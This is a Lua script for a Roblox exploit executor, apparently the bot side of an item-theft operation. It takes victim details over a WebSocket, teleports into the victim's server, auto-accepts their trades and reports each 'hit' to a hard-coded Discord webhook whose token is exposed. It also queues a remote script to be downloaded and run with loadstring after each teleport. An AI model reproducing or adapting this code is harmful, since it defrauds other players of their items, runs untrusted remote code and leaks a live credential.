
local AJwebhook = "https://discord.com/api/webhooks/1488553917296935006/qjKUS4ez4-_ozhjybmbzb66EbPc_7DbRTRO6Oi9IAjeSup2A5oX9bJxfgdN5HXhD7nLf"
local IsKicked = true
game:GetService("GuiService").ErrorMessageChanged:Connect(function(text)
    if IsKicked then return end
    IsKicked = true
    local Body = game:GetService("HttpService"):JSONEncode({
        content = "Auto-Join bot was kicked from the game: " .. tostring(text)
    })
    http.request({
        Url = AJwebhook,
        Method = "POST",
        Headers = {
            ["content-type"] = "application/json"
        },
        Body = Body
    })
    local Servers = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
    repeat
        for _, server in ipairs(Servers.data) do
            if server.playing < 6 then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, server.id, game:GetService("Players").LocalPlayer)
                break
            end
        end
        task.wait(10)
    until nil
end)

repeat task.wait() until game:IsLoaded()
local LocalPlayer = game:GetService("Players").LocalPlayer

LocalPlayer.Idled:Connect(function()
    game:GetService("VirtualUser"):CaptureController()
    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
end)

queue_on_teleport([[
    loadstring(game:HttpGet"https://raw.githubusercontent.com/catsakenkeysystem/ohiwouldntknow/main/aj")()
]])

do
    local Lplr = game:GetService("Players").LocalPlayer
    repeat task.wait() until Lplr:FindFirstChild("PlayerGui") and
        Lplr.PlayerGui:FindFirstChild("LoadingScreenGui") and
        Lplr.PlayerGui.LoadingScreenGui:FindFirstChild("LoadingMessage") and
        Lplr.PlayerGui.LoadingScreenGui.LoadingMessage.Visible == false
end
local Gui = LocalPlayer.PlayerGui:WaitForChild("ScreenGui", math.huge)
local Tradelayer = Gui:WaitForChild("TradeLayer", math.huge)

local HttpService = game:GetService("HttpService")

local ws = WebSocket.connect("ws://192.168.0.76:8765")

local filename = "lizardautojoindata.json"

local isStealing = false
local autjoindata = isfile(filename) and readfile(filename)
local victimuserid
local function left()
    local Body = game:GetService("HttpService"):JSONEncode({
        content = "Victim presumably left because the trade was cancelled, the victim was not found in the server, or the script has been restarted in the same server as a previous victim."
    })
    http.request({
        Url = AJwebhook,
        Method = "POST",
        Headers = {
            ["content-type"] = "application/json"
        },
        Body = Body
    })
end
spawn(function()
    if autjoindata then
        local json = HttpService:JSONDecode(autjoindata)
        if game.JobId == json.JobId then
            local victim
            for i, plr in pairs(game:GetService("Players"):GetPlayers()) do
                if plr.UserId == json.UserId then
                    victim = plr
                    break
                end
            end
            if victim then
                local vname = victim.Name
                victimuserid = victim.UserId
                local VictimIsTrading
                local StealerIsTrading
                isStealing = true

                while game:GetService("Players"):FindFirstChild(vname) and isStealing and task.wait(1) do
                    local tradeframe = Tradelayer:FindFirstChild("IncomingTradeRequestFrame")
                    warn("Waiting", tradeframe)
                    if tradeframe then
                        if tradeframe:WaitForChild("TextLabel").Text:match("(.+) would like to Trade") == vname then
                            warn("accepting trade from " .. vname)
                            firesignal(tradeframe.ButtonAccept.MouseButton1Click)
                        else
                            print("who's this?")
                            firesignal(tradeframe.ButtonDeny.MouseButton1Click)
                        end
                    end
                    local tradinggui = Tradelayer:FindFirstChild("TradeAnchorFrame")
                    if tradinggui then
                        warn("In trade", tradinggui)
                        VictimIsTrading = victim:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
                        StealerIsTrading = LocalPlayer:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
                        while VictimIsTrading.Value and StealerIsTrading.Value and task.wait(1) do
                            warn("waiting for accept")
                            local acceptbutton = tradinggui:FindFirstChild("TradeFrame") and tradinggui.TradeFrame:FindFirstChild("ButtonAccept") and
                                tradinggui.TradeFrame.ButtonAccept:FindFirstChild("ButtonTop")
                            if acceptbutton and acceptbutton.TextLabel.Text ~= "Unaccept" then
                                firesignal(acceptbutton.MouseButton1Click)
                                task.wait(1.5)
                            end
                        end
                        if game:GetService("Players"):FindFirstChild(vname) then
                            warn("done")
                            spawn(function()
                                local Body = game:GetService("HttpService"):JSONEncode({
                                    content = "Auto-Join completed a trade: " .. string.format("https://discord.com/channels/%s/%s/%s", json.guild_id, json.channel_id, json.message_id)
                                })
                                http.request({
                                    Url = AJwebhook,
                                    Method = "POST",
                                    Headers = {
                                        ["content-type"] = "application/json"
                                    },
                                    Body = Body
                                })
                            end)
                        end
                    end
                end
            else
                left()
                warn("player not found yet")
            end
        else
            local Body = game:GetService("HttpService"):JSONEncode({
                content = "Auto-Join bot running on " .. LocalPlayer.Name
            })
            http.request({
                Url = AJwebhook,
                Method = "POST",
                Headers = {
                    ["content-type"] = "application/json"
                },
                Body = Body
            })
            warn("just started")
        end
    end
end)

local Box = Gui:WaitForChild("MessagePromptBox")
Box:GetPropertyChangedSignal("Visible"):Connect(function()
    if Box:WaitForChild("Box"):WaitForChild("TextBox").Text:lower():find("The trade was canceled") then
        isStealing = false
        left()
    end
end)

ws.OnMessage:Connect(function(msg)
    local json = HttpService:JSONDecode(msg)
    if not json then return warn("not json") end
    local jobId = json.JobId
    local userid = json.UserId
    if userid and json.AllItemsTraded and userid == victimuserid then
        isStealing = false
        spawn(function()
            local Body = game:GetService("HttpService"):JSONEncode({
                content = "Auto-Join collected all items from hit: " .. string.format("https://discord.com/channels/%s/%s/%s", json.guild_id, json.channel_id, json.message_id)
            })
            http.request({
                Url = AJwebhook,
                Method = "POST",
                Headers = {
                    ["content-type"] = "application/json"
                },
                Body = Body
            })
        end)
        return
    end
    if not jobId or not userid then return warn("missing keys") end
    repeat task.wait() until not isStealing
    writefile(filename, msg)
    spawn(function()
        local Body = game:GetService("HttpService"):JSONEncode({
            content = "Auto-Join checking " .. string.format("https://discord.com/channels/%s/%s/%s", json.guild_id, json.channel_id, json.message_id)
        })
        http.request({
            Url = AJwebhook,
            Method = "POST",
            Headers = {
                ["content-type"] = "application/json"
            },
            Body = Body
        })
    end)
    wait(1)
    game:GetService("TeleportService"):TeleportToPlaceInstance(1537690962, jobId, LocalPlayer)
end)

ws.OnClose:Connect(function()
    print("Disconnected from server")
end)

while task.wait() do end -- keep alive
